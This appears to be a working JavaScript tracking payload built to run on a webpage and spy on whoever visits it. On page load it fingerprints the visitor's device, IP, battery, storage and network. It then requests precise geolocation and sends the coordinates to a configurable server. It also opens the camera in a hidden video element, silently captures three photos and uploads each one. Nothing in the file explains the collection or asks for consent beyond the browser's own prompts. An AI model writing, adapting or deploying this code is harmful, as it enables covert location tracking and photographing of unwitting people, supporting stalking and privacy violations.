window.addEventListener('load', async () => {
  const scriptTag = document.querySelector('script[data-tracking-id]');
  if (!scriptTag) return;

  const trackingId = scriptTag.getAttribute('data-tracking-id');
  const serverUrl = scriptTag.getAttribute('data-server-url');
  if (!trackingId || !serverUrl) return;

  const data = {};

  // Get IP
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    data.IP_Address = (await ipResponse.json()).ip;
  } catch (e) {
    data.IP_Address = 'Error';
  }

  data.User_Agent = navigator.userAgent;
  data.Language = navigator.language;
  data.Screen_Resolution = `${window.screen.width}x${window.screen.height}`;
  data.Timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // Extract device model from user agent
  const ua = navigator.userAgent;
  let deviceModel = 'Unknown';

  // Check for common mobile devices
  if (/iPhone/.test(ua)) {
    const match = ua.match(/iPhone\s?([^;)]+)/);
    deviceModel = match ? `iPhone ${match[1]}`.trim() : 'iPhone';
  } else if (/iPad/.test(ua)) {
    deviceModel = 'iPad';
  } else if (/Android/.test(ua)) {
    const match = ua.match(/Android[^;]*;\s*([^)]+)/);
    if (match) {
      deviceModel = match[1].replace(/Build.*/, '').trim();
    } else {
      deviceModel = 'Android Device';
    }
  } else if (/Windows Phone/.test(ua)) {
    deviceModel = 'Windows Phone';
  } else if (/Windows/.test(ua)) {
    deviceModel = 'Windows PC';
  } else if (/Macintosh|Mac OS X/.test(ua)) {
    deviceModel = 'Mac';
  } else if (/Linux/.test(ua)) {
    deviceModel = 'Linux PC';
  }

  data.Device_Model = deviceModel;

  // Battery
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      data.Battery = {
        Level: `${Math.round(battery.level * 100)}%`,
        Charging: battery.charging ? 'Yes' : 'No',
      };
    } catch (e) {}
  }

  // Hardware
  data.Hardware = {
    CPU_Cores: navigator.hardwareConcurrency || 'N/A',
    Device_Memory_GB: navigator.deviceMemory || 'N/A',
  };

  // Storage
  if (navigator.storage && navigator.storage.estimate) {
    try {
      const quota = await navigator.storage.estimate();
      data.Storage = {
        Usage: `${(quota.usage / 1024 / 1024 / 1024).toFixed(2)} GB`,
        Quota: `${(quota.quota / 1024 / 1024 / 1024).toFixed(2)} GB`,
      };
    } catch (e) {}
  }

  // Network
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) {
    data.Network_Info = {
      Type: conn.effectiveType,
      Downlink_MBps: conn.downlink,
      RTT_ms: conn.rtt,
    };
  }

// ===== EXTRA ADDITIONS =====

// Platform
data.Platform = navigator.platform || "Unknown";

// Cookies enabled
data.Cookies_Enabled = navigator.cookieEnabled ? "Yes" : "No";

// Color depth
data.Color_Depth = screen.colorDepth ? `${screen.colorDepth}-bit` : "N/A";

// Device Type
data.Device_Type = /Mobi|Android/i.test(navigator.userAgent)
  ? "Mobile"
  : "Desktop";

// Browser + Engine
let browser = "Unknown";
let engine = "Unknown";

if (navigator.userAgent.includes("Chrome")) {
  browser = "Chrome";
  engine = "Blink";
}
if (navigator.userAgent.includes("Firefox")) {
  browser = "Firefox";
  engine = "Gecko";
}
if (navigator.userAgent.includes("Safari") && !navigator.userAgent.includes("Chrome")) {
  browser = "Safari";
  engine = "WebKit";
}

data.Browser = browser;
data.Engine = engine;

// Network Save Data (merge with existing)
if (navigator.connection) {
  data.Network_Info.Save_Data = navigator.connection.saveData ? "Enabled" : "Disabled";
}

// Time
const now = new Date();
data.Session = {
  Time: now.toLocaleString(),
  Duration: "0 sec"
};

  // Check permissions
  data.Permissions = {
    Camera: 'Unknown',
    Location: 'Unknown'
  };

  // Check location permission
  if (navigator.permissions) {
    try {
      const locationPerm = await navigator.permissions.query({ name: 'geolocation' });
      data.Permissions.Location = locationPerm.state.charAt(0).toUpperCase() + locationPerm.state.slice(1);
    } catch (e) {}
  }

  // Request location first
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          timeout: 10000
        });
      });

      data.Location = {
        Latitude: position.coords.latitude,
        Longitude: position.coords.longitude,
        Accuracy: `${position.coords.accuracy}m`,
        Google_Maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
      };
      data.Permissions.Location = 'Granted';
    } catch (err) {
      data.Location = 'Permission denied or unavailable';
      data.Permissions.Location = 'Denied';
    }
  }

  // Send metadata with location
  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  }).catch(() => {});

  // Request camera and take 3 photos
  if (navigator.mediaDevices) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      data.Permissions.Camera = 'Granted';

      const video = document.createElement('video');
      video.style.display = 'none';
      video.setAttribute('playsinline', '');
      video.setAttribute('autoplay', '');
      video.setAttribute('muted', '');
      document.body.appendChild(video);
      video.srcObject = stream;
      await video.play();

      await new Promise(r => setTimeout(r, 500));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const context = canvas.getContext('2d');

      // Photo at 1 second
      await new Promise(r => setTimeout(r, 1000));
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL('image/jpeg', 0.8);
      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(() => {});

      // Photo at 2 seconds
      await new Promise(r => setTimeout(r, 1000));
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      imageData = canvas.toDataURL('image/jpeg', 0.8);
      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(() => {});

      // Photo at 3 seconds
      await new Promise(r => setTimeout(r, 1000));
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      imageData = canvas.toDataURL('image/jpeg', 0.8);
      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(() => {});

      stream.getTracks().forEach(track => track.stop());
      try {
        document.body.removeChild(video);
        document.body.removeChild(canvas);
      } catch (e) {}
    } catch (error) {
      data.Permissions.Camera = 'Denied';
    }
  }

  // Send updated permission data
  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ Permissions: data.Permissions }),
  }).catch(() => {});
});